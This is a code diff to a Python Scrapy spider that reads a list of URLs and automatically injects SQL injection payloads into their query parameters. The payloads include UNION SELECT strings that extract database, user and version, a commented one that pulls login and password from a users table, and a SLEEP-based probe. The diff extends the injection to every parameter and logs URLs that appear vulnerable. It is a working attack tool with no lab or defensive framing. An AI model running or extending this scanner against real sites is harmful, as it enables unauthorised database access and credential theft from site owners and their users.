@@ -18,9 +18,13 @@ import json
 error_payloads = ["+and+SLAP(10)+--+",
 					"'kasdgh",
 					"+AND+SEELCT"]
-actual_payloads = ["%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+%20%3E%3E%2",
-"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+",
-"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+"]
+actual_payloads = [#"%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+%20%3E%3E%2",
+#"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+",
+#"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+",
+#"%20UNION%20ALL%20SELECT%201,2,3,password,5,6,login,8,9,10,11,12%20FROM%20users%20--",
+"%27+and+1=2+union+select+1,2,3+--+",
+"+and+SLEEP%2810%29+--+"
+]
 
 links = open('links.txt','r')
 urls = links.readlines()
@@ -29,8 +33,8 @@ items = []
 fin = []
 dic = {}
 tempResponse = ""
-searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column","access violation","SQLSTATE", 
- "different number of columns","Cardinality violation"]
+searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column","access violation","sqlstate", 
+ "different number of columns","cardinality violation", "undefined index"]
 
 class step3(Spider):
 	name = "step3"
@@ -127,15 +131,34 @@ class step3(Spider):
 			if (temp not in items):
 					items.append(temp)
 					#UnionAndSelectAttacks
-					attackLink1 = temp+actual_payloads[0]
-					yield Request(attackLink1, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
-					attackLink2 = temp+actual_payloads[1]
-					yield Request(attackLink2, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
-					attackLink3 = temp+actual_payloads[2]
-					yield Request(attackLink3, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
-					file2 = open("vulnerableinks.txt","w")
-					file2.write(temp+"\n")
-					file2.close()
+					for actual_payload in actual_payloads:
+							attackLink = temp+actual_payload
+							yield Request(attackLink, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+							file2 = open("vulnerableinks.txt","w")
+							file2.write(temp+"\n")
+							if "&" in temp:
+									queryVals = temp.split('&')
+									length = len(queryVals)
+									for i in range(0,length-1):
+											dupVals = copy.copy(queryVals);
+											dupVals[i] = dupVals[i]+actual_payload
+											finLink = "";
+											for i in range(0,length-1):
+													if i == 0:
+														finLink += dupVals[i]
+													else:
+														finLink += "&"+dupVals[i]
+											yield Request(finLink, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+							file2.close()
+					#attackLink1 = temp+actual_payloads[0]
+					#yield Request(attackLink1, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+					#attackLink2 = temp+actual_payloads[1]
+					#yield Request(attackLink2, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+					#attackLink3 = temp+actual_payloads[2]
+					#yield Request(attackLink3, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+					#file2 = open("vulnerableinks.txt","w")
+					#file2.write(temp+"\n")
+					#file2.close()
 		return
 
 	def actual_attack_resp(self, response):
@@ -147,8 +170,7 @@ class step3(Spider):
 		file4 = open("justToCheck.txt","a")
 		file4.write(response.url)
 		file4.close()
-		print "#############################################"
-		if not attackResponse == original:
+		if not ( attackResponse == original or attackResponse == "" ):
 			if not any(term in response.body.lower() for term in searchterms):
 				file4 = open("actualAttacks.txt","a")
 				file4.write(response.url+"\n")
